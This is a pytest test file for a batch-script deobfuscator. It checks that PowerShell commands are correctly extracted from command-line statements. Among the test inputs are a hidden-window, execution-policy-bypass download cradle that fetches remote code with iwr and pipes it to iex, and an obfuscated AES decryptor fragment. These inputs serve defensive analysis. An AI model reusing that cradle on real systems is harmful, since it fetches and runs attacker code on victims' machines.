import pytest

from batch_deobfuscator.batch_interpreter import BatchDeobfuscator


@pytest.mark.parametrize(
    "statement, extracted_ps1",
    [
        ("powershell /e ZQBjAGgAbwAgAGIAZQBlAA==", b"echo bee"),
        (
            "powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"",
            b"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}",
        ),
        (
            "powershell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\some.PS1",
            None,
        ),
        (
            "PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\\ProgramData\\x64\\ISO\\x64.ps1",
            b"C:\\ProgramData\\x64\\ISO\\x64.ps1",
        ),
        ("powershell -arg1 -arg2 command", b"command"),
        ("powershell command", b"command"),
        ("powershell.exe command", b"command"),
        ("powershell.exe echo bee", b"echo bee"),
        ("powershell -noprofile -w hidden -ep bypass -c echo bee", b"echo bee"),
        (
            "powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://1.1.1.1:8080/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex\"",
            b"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://1.1.1.1:8080/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex",
        ),
        (
            "powershell -noprofile -w hidden -ep bypass -c function Fbeoh($mFNAo){$iXJIL = New-Object System.Security.Cryptography.AesManaged $iXJIL.Mode [Deleted for tests] $UUzNc (  [string[]] (''))",
            b"function Fbeoh($mFNAo){$iXJIL = New-Object System.Security.Cryptography.AesManaged $iXJIL.Mode [Deleted for tests] $UUzNc ( [string[]] (''))",
        ),
        (
            "powershell -Command \"& {get-process onedrive | add-member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Format-Table Name,Elevated}\" > \"%WORKINGDIRONEDRIVE%\\OneDriveElevated.txt\"",
            b"& {get-process onedrive | add-member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Format-Table Name,Elevated}",
        ),
    ],
)
def test_one(statement, extracted_ps1):
    bd = BatchDeobfuscator()
    bd.interpret_powershell(statement)
    if extracted_ps1 is None:
        assert len(bd.exec_ps1) == 0
    else:
        assert len(bd.exec_ps1) == 1
        assert bd.exec_ps1[0] == extracted_ps1
